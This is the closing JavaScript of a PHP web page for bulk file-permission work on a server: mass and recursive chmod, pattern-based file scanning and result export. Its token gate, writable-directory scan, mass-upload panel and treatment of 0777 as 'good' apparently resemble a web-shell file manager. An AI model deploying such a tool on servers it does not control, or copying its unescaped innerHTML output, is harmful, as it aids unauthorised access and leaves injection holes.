  const targetDir = document.getElementById('mass_chmod_target').value.trim();
  const dirMode = document.getElementById('dir_mode').value.trim();
  const fileMode = document.getElementById('file_mode').value.trim();
  const maxDepth = document.getElementById('mass_chmod_depth').value;
  const exportTxt = document.getElementById('mass_chmod_export').checked;
  const accessToken = document.getElementById('access_token').value.trim();

  if (!targetDir) {
    log('Target directory is required', 'bad');
    return;
  }

  if (!dirMode) {
    log('Directory mode is required', 'bad');
    return;
  }

  if (!fileMode) {
    log('File mode is required', 'bad');
    return;
  }

  log('Starting Mass Chmod on ' + targetDir + '...', 'warn');
  log('Directory: ' + dirMode + ', File: ' + fileMode, 'warn');

  const formData = new FormData();
  formData.append('action', 'mass_chmod_separate');
  formData.append('target_dir', targetDir);
  formData.append('dir_mode', dirMode);
  formData.append('file_mode', fileMode);
  formData.append('max_depth', maxDepth);
  formData.append('export_txt', exportTxt ? '1' : '0');
  if (accessToken) formData.append('access_token', accessToken);
  formData.append('base_dir', document.getElementById('base_dir').value.trim());

  document.getElementById('btnMassChmod').disabled = true;

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => {
    const contentType = response.headers.get('content-type');
    if (contentType && contentType.includes('text/plain')) {
      return response.blob().then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'mass_chmod_results_' + new Date().toISOString().replace(/[:.]/g, '-') + '.txt';
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
        
        log('Mass Chmod completed. Results exported.', 'good');
        document.getElementById('btnMassChmod').disabled = false;
        return null;
      });
    } else {
      return response.json();
    }
  })
  .then(data => {
    if (!data) return;
    document.getElementById('btnMassChmod').disabled = false;
    
    if (data.ok) {
      log('Mass Chmod completed!', 'good');
      log('Directories success: ' + data.results.success_dirs, 'good');
      log('Directories failed: ' + data.results.failed_dirs, data.results.failed_dirs > 0 ? 'warn' : 'good');
      log('Files success: ' + data.results.success_files, 'good');
      log('Files failed: ' + data.results.failed_files, data.results.failed_files > 0 ? 'warn' : 'good');
      log('Total changed: ' + data.results.changed_items.length, 'good');
      
      if (data.results.errors && data.results.errors.length > 0) {
        log('Errors:', 'bad');
        data.results.errors.forEach(error => {
          log('  - ' + error, 'bad');
        });
      }
      
      showChmodResults(data);
    } else {
      log('Mass Chmod failed: ' + data.error, 'bad');
    }
  })
  .catch(err => {
    document.getElementById('btnMassChmod').disabled = false;
    log('Network error: ' + err.message, 'bad');
  });
}

function chmodRecursive() {
  const target = document.getElementById('chmod_target').value.trim();
  const mode = document.getElementById('chmod_mode').value.trim();
  const accessToken = document.getElementById('access_token').value.trim();

  if (!target) {
    log('Target is required', 'bad');
    return;
  }

  if (!mode) {
    log('Chmod mode is required', 'bad');
    return;
  }

  log('Applying chmod ' + mode + ' to ' + target + '...', 'warn');

  const formData = new FormData();
  formData.append('action', 'chmod_recursive');
  formData.append('target_dir', target);
  formData.append('chmod_mode', mode);
  if (accessToken) formData.append('access_token', accessToken);
  formData.append('base_dir', document.getElementById('base_dir').value.trim());

  document.getElementById('btnChmod').disabled = true;

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    document.getElementById('btnChmod').disabled = false;
    
    if (data.ok) {
      log('Chmod completed!', 'good');
      log('Success: ' + data.results.success, 'good');
      log('Failed: ' + data.results.failed, data.results.failed > 0 ? 'warn' : 'good');
    } else {
      log('Chmod failed: ' + data.error, 'bad');
    }
  })
  .catch(err => {
    document.getElementById('btnChmod').disabled = false;
    log('Network error: ' + err.message, 'bad');
  });
}

function scanFiles() {
  const baseDir = document.getElementById('files_base_dir').value.trim();
  const pattern = document.getElementById('file_pattern').value.trim();
  const maxFiles = document.getElementById('max_files').value;
  const skipSymlink = document.getElementById('skip_symlink_files').checked;
  const accessToken = document.getElementById('access_token').value.trim();

  if (!baseDir) {
    log('Base directory is required', 'bad');
    return;
  }

  if (!pattern) {
    log('File pattern is required', 'bad');
    return;
  }

  log('Scanning files with pattern "' + pattern + '"...', 'warn');

  const formData = new FormData();
  formData.append('action', 'scan_files');
  formData.append('base_dir', baseDir);
  formData.append('file_pattern', pattern);
  formData.append('max_files', maxFiles);
  formData.append('skip_symlink', skipSymlink ? '1' : '0');
  if (accessToken) formData.append('access_token', accessToken);

  document.getElementById('btnScanFiles').disabled = true;

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    document.getElementById('btnScanFiles').disabled = false;
    
    if (data.ok) {
      log('File scan completed: ' + data.returned + ' files found', 'good');
      showScanResults({
        items: data.files,
        returned: data.returned,
        base: data.base
      });
    } else {
      log('File scan failed: ' + data.error, 'bad');
    }
  })
  .catch(err => {
    document.getElementById('btnScanFiles').disabled = false;
    log('Network error: ' + err.message, 'bad');
  });
}

function exportScanResults(type) {
  let items = [];
  
  if (type === 'directories') {
    const rows = document.querySelectorAll('#resultBody tr');
    if (rows.length === 0) {
      log('No data to export. Please scan first.', 'bad');
      return;
    }
    
    rows.forEach(row => {
      const cells = row.querySelectorAll('td');
      items.push({
        path: cells[0].textContent,
        perm: cells[1].querySelector('.tag').textContent,
        writable: cells[2].querySelector('.tag').textContent,
        type: cells[3].querySelector('.tag').textContent,
        depth: 0
      });
    });
  } else if (type === 'files') {
    log('Please scan files first', 'bad');
    return;
  }
  
  const formData = new FormData();
  formData.append('action', 'export_scan_results');
  formData.append('export_type', type);
  formData.append('export_data', JSON.stringify(items));
  
  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(response => response.blob())
  .then(blob => {
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'scan_results_' + type + '_' + new Date().toISOString().replace(/[:.]/g, '-') + '.txt';
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
    
    log('Export completed: ' + a.download, 'good');
  })
  .catch(err => {
    log('Export failed: ' + err.message, 'bad');
  });
}

function showChmodResults(data) {
  const tbody = document.getElementById('chmodResultBody');
  tbody.innerHTML = '';
  
  if (data.results.changed_items && data.results.changed_items.length > 0) {
    data.results.changed_items.forEach(item => {
      const tr = document.createElement('tr');
      
      const tdPath = document.createElement('td');
      tdPath.className = 'path';
      tdPath.textContent = item.path;
      
      const tdType = document.createElement('td');
      tdType.innerHTML = '<span class="tag">' + item.type + '</span>';
      
      const tdBefore = document.createElement('td');
      tdBefore.innerHTML = '<span class="tag ' + (item.before === '0755' || item.before === '0777' ? 'good' : 'warn') + '">' + item.before + '</span>';
      
      const tdAfter = document.createElement('td');
      tdAfter.innerHTML = '<span class="tag ' + (item.after === '0755' || item.after === '0777' ? 'good' : 'warn') + '">' + item.after + '</span>';
      
      const tdDepth = document.createElement('td');
      tdDepth.textContent = item.depth;
      
      tr.appendChild(tdPath);
      tr.appendChild(tdType);
      tr.appendChild(tdBefore);
      tr.appendChild(tdAfter);
      tr.appendChild(tdDepth);
      
      tbody.appendChild(tr);
    });
  }
  
  document.getElementById('chmodResultCount').textContent = data.results.changed_items.length + ' items changed';
  document.getElementById('chmodResultTarget').textContent = 'Target: ' + data.target;
  document.getElementById('scanResults').style.display = 'none';
  document.getElementById('massUploadResults').style.display = 'none';
  document.getElementById('chmodResults').style.display = 'block';
}

function setChmodMode(mode) {
  document.getElementById('chmod_mode').value = mode;
}

function basename(path) {
  return path.split(/[\\/]/).pop();
}

document.getElementById('mass_base_dir').addEventListener('change', function() {
  document.getElementById('mass_chmod_target').value = this.value;
});

document.getElementById('base_dir').addEventListener('change', function() {
  document.getElementById('files_base_dir').value = this.value;
});

log('Ready. Current PWD: <?php echo htmlspecialchars($DEFAULT_BASE, ENT_QUOTES); ?>');
</script>
</body>
</html>